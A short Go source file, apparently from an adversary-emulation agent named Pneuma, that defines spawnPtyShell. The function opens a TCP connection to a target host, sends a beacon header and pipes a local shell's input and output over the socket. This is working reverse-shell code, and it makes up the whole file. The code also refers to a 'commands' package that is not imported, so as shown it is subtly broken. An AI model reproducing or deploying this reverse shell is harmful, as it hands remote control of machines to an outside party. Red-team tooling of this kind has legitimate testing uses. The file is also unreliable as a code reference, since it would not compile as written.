package pty

import (
	"context"
	"github.com/preludeorg/pneuma/util"
	"net"
	"os/exec"
)

func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return agent.Pid, commands.ErrorExitStatus, err
	}
	header, err := agent.BuildSocketBeacon("piped")
	if err != nil {
		return agent.Pid, commands.ErrorExitStatus, err
	}
	
	ctx, cancel := context.WithCancel(context.Background())
	shell := exec.CommandContext(ctx, executor)
	go cancelOnSocketClose(cancel, conn)
	conn.Write(header)
	shell.Stdout = conn
	shell.Stdin = conn
	shell.Stderr = conn
	if err = shell.Start(); err == nil {
		return shell.Process.Pid, commands.SuccessExitStatus, nil
	}
	return agent.Pid, commands.ErrorExitStatus, err
}